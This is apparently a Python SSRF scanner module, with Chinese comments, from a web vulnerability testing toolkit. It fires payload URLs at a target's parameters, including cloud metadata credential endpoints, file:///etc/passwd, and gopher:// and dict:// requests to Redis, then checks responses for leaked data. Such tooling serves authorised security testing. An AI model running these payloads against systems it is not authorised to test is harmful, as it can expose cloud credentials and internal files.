#!/usr/bin/env python3
"""
SSRF 检测器 - 基于 BaseDetector 重构

支持检测类型:
- 基础 SSRF (内网访问)
- 云元数据 SSRF (AWS/GCP/Azure)
- 协议滥用 (file://, dict://, gopher://)
- 盲 SSRF (基于时间差异)
"""

import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import quote, urlparse

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from tools.detectors.base import BaseDetector, Vulnerability


class SSRFDetector(BaseDetector):
    """SSRF 服务端请求伪造检测器"""

    # 覆盖默认测试参数
    DEFAULT_PARAMS = [
        "url", "uri", "path", "src", "source", "link", "redirect",
        "target", "dest", "fetch", "proxy", "callback", "next",
        "data", "load", "file", "page", "ref", "site", "host"
    ]

    # 内网 IP Payload
    INTERNAL_PAYLOADS = [
        # IPv4 内网
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        "http://127.0.0.1:9200",
        "http://127.0.0.1:11211",
        # IPv6
        "http://[::1]",
        "http://[::1]:22",
        # 内网段
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://192.168.0.1",
        "http://192.168.1.1",
        # 绕过技巧
        "http://127.1",
        "http://0.0.0.0",
        "http://0",
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
    ]

    # 云元数据 Payload
    CLOUD_METADATA_PAYLOADS = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        # Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/",
    ]

    # 协议滥用 Payload
    PROTOCOL_PAYLOADS = [
        # File 协议
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system32/drivers/etc/hosts",
        # Dict 协议 (Redis)
        "dict://127.0.0.1:6379/info",
        "dict://127.0.0.1:6379/CONFIG GET *",
        # Gopher 协议
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:6379/_CONFIG%20GET%20*",
        # FTP
        "ftp://127.0.0.1:21",
    ]

    # SSRF 成功指示器
    INTERNAL_INDICATORS = [
        # Linux 系统文件
        "root:", "daemon:", "bin:", "nobody:",
        "/bin/bash", "/bin/sh",
        # Windows 系统文件
        "extensions", "for 16-bit app support", "[fonts]",
        # 服务指示器
        "localhost", "127.0.0.1", "internal",
        # SSH Banner
        "SSH-", "OpenSSH",
        # Redis
        "redis_version", "connected_clients", "used_memory",
        # MongoDB
        "mongodb", "ismaster",
        # Elasticsearch
        "cluster_name", "cluster_uuid",
    ]

    # 云元数据指示器
    CLOUD_INDICATORS = [
        # AWS
        "ami-id", "instance-id", "instance-type", "local-ipv4",
        "security-credentials", "iam", "AccessKeyId", "SecretAccessKey",
        # GCP
        "computeMetadata", "project-id", "service-accounts",
        # Azure
        "vmId", "subscriptionId", "resourceGroupName",
        # 通用
        "meta-data", "metadata", "instance",
    ]

    # 错误指示器 (可能表明存在 SSRF)
    ERROR_INDICATORS = [
        "connection refused", "connection timed out",
        "could not connect", "failed to connect",
        "no route to host", "network unreachable",
        "name or service not known", "getaddrinfo failed",
    ]

    def get_payloads(self) -> Dict[str, List[str]]:
        """获取 Payload 库"""
        return {
            "Internal SSRF": self.INTERNAL_PAYLOADS,
            "Cloud Metadata SSRF": self.CLOUD_METADATA_PAYLOADS,
            "Protocol Abuse SSRF": self.PROTOCOL_PAYLOADS,
        }

    def validate_response(
        self,
        response: Dict[str, Any],
        payload: str,
        baseline: Dict[str, Any] = None
    ) -> bool:
        """验证响应是否表明存在 SSRF"""
        if not response or not response.get("success"):
            return False

        resp_text = response.get("response_text", "").lower()

        # 检查内网指示器
        for indicator in self.INTERNAL_INDICATORS:
            if indicator.lower() in resp_text:
                return True

        # 检查云元数据指示器
        for indicator in self.CLOUD_INDICATORS:
            if indicator.lower() in resp_text:
                return True

        return False

    def detect_internal(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测内网 SSRF"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params:
            for payload in self.INTERNAL_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                # 检查指示器
                found_indicator = None
                for indicator in self.INTERNAL_INDICATORS:
                    if indicator.lower() in resp_text.lower():
                        found_indicator = indicator
                        break

                if found_indicator:
                    vulnerabilities.append(Vulnerability(
                        type="Internal SSRF",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"检测到内网访问指示器: {found_indicator}",
                        verified=False,
                        confidence=0.85,
                        details={
                            "indicator": found_indicator,
                            "target": payload,
                            "response_length": len(resp_text)
                        }
                    ))
                    break  # 找到一个就停止该参数的测试

        return vulnerabilities

    def detect_cloud_metadata(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测云元数据 SSRF"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params:
            for payload in self.CLOUD_METADATA_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                # 检查云元数据指示器
                found_indicator = None
                cloud_type = None

                for indicator in self.CLOUD_INDICATORS:
                    if indicator.lower() in resp_text.lower():
                        found_indicator = indicator
                        # 判断云类型
                        if "ami-id" in indicator or "AccessKeyId" in indicator:
                            cloud_type = "AWS"
                        elif "computeMetadata" in indicator or "project-id" in indicator:
                            cloud_type = "GCP"
                        elif "vmId" in indicator or "subscriptionId" in indicator:
                            cloud_type = "Azure"
                        else:
                            cloud_type = "Unknown"
                        break

                if found_indicator:
                    vulnerabilities.append(Vulnerability(
                        type="Cloud Metadata SSRF",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"检测到 {cloud_type} 云元数据访问: {found_indicator}",
                        verified=False,
                        confidence=0.95,
                        details={
                            "cloud_type": cloud_type,
                            "indicator": found_indicator,
                            "target": payload,
                            "response_length": len(resp_text)
                        }
                    ))
                    break

        return vulnerabilities

    def detect_protocol_abuse(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测协议滥用 SSRF"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params:
            for payload in self.PROTOCOL_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                # 检查指示器
                found_indicator = None
                protocol = payload.split(":")[0] if ":" in payload else "unknown"

                for indicator in self.INTERNAL_INDICATORS:
                    if indicator.lower() in resp_text.lower():
                        found_indicator = indicator
                        break

                if found_indicator:
                    vulnerabilities.append(Vulnerability(
                        type=f"Protocol Abuse SSRF ({protocol}://)",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"通过 {protocol}:// 协议访问成功: {found_indicator}",
                        verified=False,
                        confidence=0.9,
                        details={
                            "protocol": protocol,
                            "indicator": found_indicator,
                            "target": payload,
                            "response_length": len(resp_text)
                        }
                    ))
                    break

        return vulnerabilities

    def detect_blind(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测盲 SSRF (基于错误信息和时间差异)"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        # 获取基线响应时间
        baseline = self.get_baseline(url)
        baseline_time = baseline.get("response_time", 0) if baseline else 0

        # 使用会导致延迟的目标
        blind_payloads = [
            ("http://10.255.255.1", 5),  # 不可达的内网 IP
            ("http://192.168.255.255", 5),
            ("http://172.31.255.255", 5),
        ]

        for test_param in test_params:
            for payload, expected_delay in blind_payloads:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response:
                    continue

                resp_text = response.get("response_text", "").lower()
                response_time = response.get("response_time", 0)

                # 检查错误指示器
                found_error = None
                for indicator in self.ERROR_INDICATORS:
                    if indicator in resp_text:
                        found_error = indicator
                        break

                # 检查时间延迟
                has_delay = response_time >= expected_delay * 0.7 and response_time >= baseline_time + 3

                if found_error or has_delay:
                    evidence = []
                    if found_error:
                        evidence.append(f"错误信息: {found_error}")
                    if has_delay:
                        evidence.append(f"响应延迟: {response_time:.2f}s")

                    vulnerabilities.append(Vulnerability(
                        type="Blind SSRF",
                        severity="HIGH",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence="; ".join(evidence),
                        verified=False,
                        confidence=0.6 if found_error else 0.5,
                        details={
                            "error_indicator": found_error,
                            "response_time": response_time,
                            "baseline_time": baseline_time,
                            "has_delay": has_delay
                        }
                    ))
                    break

        return vulnerabilities

    def detect(
        self,
        url: str,
        param: Optional[str] = None,
        deep_scan: bool = True
    ) -> Dict[str, Any]:
        """
        SSRF 检测入口

        Args:
            url: 目标 URL
            param: 指定参数 (可选)
            deep_scan: 是否深度扫描 (包含协议滥用和盲 SSRF 检测)

        Returns:
            检测结果字典
        """
        all_vulnerabilities = []

        # 1. 内网 SSRF 检测
        internal_vulns = self.detect_internal(url, param)
        all_vulnerabilities.extend(internal_vulns)

        # 2. 云元数据 SSRF 检测
        cloud_vulns = self.detect_cloud_metadata(url, param)
        all_vulnerabilities.extend(cloud_vulns)

        if deep_scan:
            # 3. 协议滥用检测
            protocol_vulns = self.detect_protocol_abuse(url, param)
            all_vulnerabilities.extend(protocol_vulns)

            # 4. 盲 SSRF 检测 (仅当未发现确定漏洞时)
            if not internal_vulns and not cloud_vulns and not protocol_vulns:
                blind_vulns = self.detect_blind(url, param)
                all_vulnerabilities.extend(blind_vulns)

        # 二次验证
        verified_vulns = []
        for vuln in all_vulnerabilities:
            if not vuln.verified:
                if self.verify_vulnerability(vuln):
                    vuln.verified = True
                    vuln.confidence = min(1.0, vuln.confidence + 0.1)
            verified_vulns.append(vuln)

        return {
            "success": True,
            "url": url,
            "detector": self.__class__.__name__,
            "vulnerabilities": [v.to_dict() for v in verified_vulns],
            "total": len(verified_vulns),
            "verified_count": sum(1 for v in verified_vulns if v.verified),
            "by_type": {
                "internal": sum(1 for v in verified_vulns if "Internal" in v.type),
                "cloud_metadata": sum(1 for v in verified_vulns if "Cloud" in v.type),
                "protocol_abuse": sum(1 for v in verified_vulns if "Protocol" in v.type),
                "blind": sum(1 for v in verified_vulns if "Blind" in v.type),
            }
        }


# 便捷函数 - 兼容旧接口
def ssrf_detect(url: str, param: str = None, deep_scan: bool = True) -> Dict[str, Any]:
    """SSRF 检测 (兼容旧接口)"""
    with SSRFDetector() as detector:
        return detector.detect(url, param, deep_scan)
